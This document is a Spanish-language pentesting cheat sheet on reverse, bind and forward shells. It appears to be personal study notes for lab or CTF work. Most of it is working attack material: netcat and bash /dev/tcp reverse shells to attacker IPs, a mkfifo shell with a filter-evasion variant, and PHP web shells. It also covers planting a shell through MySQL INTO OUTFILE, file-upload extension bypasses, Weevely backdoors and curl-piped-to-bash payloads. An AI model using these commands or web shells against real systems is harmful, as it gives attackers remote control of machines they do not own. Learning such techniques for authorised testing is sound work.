# Tipos de ReverShell

Tags: #ReverShell #Comandos #Netcat #BindShell

Tenemos diferentes tipos de Revershell este pagina Web:
* [Monkey-Pentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [ReverseShells-Generator](https://www.revshells.com/) 
* [Cheatsheet-ReverseShells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndose tomar el control de la máquina remota.

**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

La mayoría de las paginas al momento de comprometerlas encontraremos el usuario **www-data** que es el encargado de gestionar la parte de servicios web.

## Webshell/ReverseShell en Kali

```bash 
❯ ls -al /usr/share/webshells/               # En esa ruta tenemos diferetes Revershell o Webshells
```

## Netcat

```bash 
# Netcat nos ayuda a poder hacer 'Banner grabbing, Port scanning, Transferring files, Bind/Reverse shells', puede ser utilizado como 'Modo cliente, Modo servidor'

❯ nc -nv <IP> <port>        # Hacer que Netcat se conecte a un puerto especifico de una IP por TCP
❯ nc -nvu <IP> <port>       # Hacer que Netcat se conecte a un puerto especifico de una IP por UDP
	# n = No DNS
	# u = UDP 
	# v = Verbose


❯ nc -nc <IP> <Port> < file.txt        # Esta es la forma de enviar un archivo (Maquina atacante 'Envia')
❯ nc -nlvp 443 > file.txt              # El archivo que reciba lo colocara en file.txt (Maquina victima 'Recibe')
```

## RCE MySQL

```bash 
# Debemos estar dentro del servicio de MySQL

❯ select '<?php  $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell.php' from mysql.user limit 1; 

# Ahora en la URL podemos ejecutar comandos 
❯ shell.php?cmd=whoami            
```

## Reverse / Bind Shells directamente

```bash 
# Desde la URL de la Web (Maquina victima)

❯ nc -nlvp 443   # Ponernos en escucha con Netcat (Maquina atacante) Linux     

# Para la Revershell en la URL de la web (Maquina victima)
❯ nc -e /bin/bash IP 443
❯ bash -i >& /dev/tcp/IP/443 0>&1
	# Ip = Ip del atacante 

❯ bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"
# Donde debemos de urlencodear el '&'
	& = %26
```

```bash 
# Desde la terminal del SO
❯ /usr/share/Seclists/Web-Shells/FuzzDB/nc.exe     # nc.exe nos ayuda a conseguir una ReverShell en Windows (Ruta en Linux)

❯ nc -nlvp 443                                     # Ponernos en escucha con Netcat (Maquina atacante) 
❯ nc.exe -nv <IP> 443 -e cmd.exe                   # Completar la Reverse shell desde una maquina victima Windows

❯ nc -nlvp 443                                     # Ponernos en escucha con Netcat (Maquina atacante) 
❯ nc -nv <IP> 443 -e /bin/bash                     # Completar la Reverse shell desde una maquina victima Linux
```

## Bind Shell:

```bash
# Desde la terminal del SO

1. ❯ nc.exe -nlvp 443 -e cmd.exe            # Ejecutamos desde la terminal (Maquina victima) para ponernos en escucha y hacer una BindShell en Windows 
1. ❯ nc IP 443                              # Ejecutamos en para completar la Bind Shell (Maquina atacante) Linux


2. ❯ nc -nlvp 443 -c /bin/bash              # Ejecutamos desde la terminal (Maquina victima) para ponernos en escucha y hacer una BindShell en Linux
2. ❯ nc.ex -nv IP 443                       # Ejecutamos en para completar la Bind Shell (Maquina atacante) Windows 
```

## Bypass PHPx Blacklist 

```bash 
# Diferentes extensiones PHP para subir 'Shells' maliciosas 

* php
* php3
* php4
* php5
* php6
* php7
* pht
* phtm
* phtml
* phar

```

## Bypass Web Weevely

```bash 
# Byppass en Nginx, subimos el archivo con la extension que permite subir, despues en la url lo cambiamos al formato php y ejecutamos los comandos 

❯ http://IP/uploads/shell.jpg/shell.php?cmd=whoami

	# shell.jpg = Extension que nos deja subir la web
```

```bash 
# Otra forma de evadir la subida de archivos y obtener una Revershell 

❯ weevely generate password ~/Desktop/weevely.jpg     # Creamos un archivo con la extension que nos deja subir 
❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd   # Hara automaticamente una revershell con la peticion http request 
	❯ :help                         # Muestra los comandos que podemos utilizar 
	❯ :system_info                  # Muestra la info del sistema 

❯ weevely https://IP/uploads/shell.php password           # Otra forma de conectarse a Weevely obteniendo la Revershell
	❯ ls                            # Listamos el contenido 

❯ weevely generate password /root/shell.php.jpg           # Creamos una revershell con extension 'php.jpg' para pasar el filtro en WordPress de cargar imagenes 
```

## RCE en Web

```php
# Para ejecutar comandos en la Web debemos de crear o subir un archivo en el /var/www/html con el siguiente contenido: 

❯ nano cmd.php

	<?php 
		echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
	?>

# Las etiquetas que usamos ahí son 'Pre' de preformateadas y nos sirven para que nos muestre bien el Output. Ya con ese archivo y que la Web interprete 'php' podemos colocar en la url (?cmd=) para colocar comandos y ver que Shell podriamos usar para conectarmos a nuestra maquina de 'Atacante'

# Otra manera 
	<?php 
		$output = shell_exec($_GET["cmd"]);
		echo "<pre>$output</pre>";
	?>

```

## Index.html

```bash
❯ nano index.html
	#!/bin/bash
	bash -i >& /dev/tcp/10.10.14.2/443 0>&1

	# IP = IP de atacante
	# 443 = Puerto a usar

❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

## ReverShell en php:

```php
<?php
   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
?>

	# IP = IP de atacante
	# 443 = Puerto a usar
```

```bash
# Escucha por Netcat en espera de la Revershell

❯ nc -nlvp 443            # Linux

❯ rlwrap nc -nlvp 443     # Windows 

	# nc = Netcat 
	# n = No DNS
	# l = Modo escucha, conexiones entrantes
	# v = verbose
	# p = numero local de puerto en esucha

```

```bash 
❯ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 443 >/tmp/f          # Podemos usar este comando para hacer una Revershell desde una bash en la maquina victima 
❯ r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4242 >/tmp/f   # Evadir filtros

# Nos debemos de poner en escucha antes de esta manera
❯ nc -nlvp 443                   # Escucha en la maquina de atacante
```

```bash 
❯ pwncat-cs -lp 443                         # Podemos usar esta herramienta llamada 'Pwncat'
	❯ run enumerate                        # Enumera todo el sistema 
	❯ run enumerate.user                   # Enumeras los usuarios
	❯ run enumerate.system.network         # Enumeras las interfaces de la maquina 
	❯ back                                 # Nos coloca en la ruta de la terminal de la victima
```

## ForwardShell

Para ejecutar comandos en la Web debemos de crear o subir un archivo en el **/var/www/html** con el siguiente contenido: 
```shell
❯ nano cmd.php
	<?php 
		echo shell_exec($_GET['cmd']);
	?>

```
Las etiquetas que usamos ahi son **Pre** de preformateadas y nos sirven para que nos muestre bien el Output
Ya con ese archivo y que la Web interprete **php** podemos colocar en la url **?cmd=** y ahí pode colocar comandos y conectarnos a nuestra maquina de **Atacante** por una **ForwardShell**

Descargaremos el siguiente archivo y lo ejecutaremos con Pyhton3 para hacer una **ForwardShell**: 
Debemos estar en la pestana de **Raw**
* [Tty_Over_Http](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py)
```bash
❯ wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py

	# Descargarnos el archivo 'tty_over_html'
	# Cambiamos la parte de index.php por cmd.php (Dependiendo el servidor)

❯ python3 tty_over_http.py 
```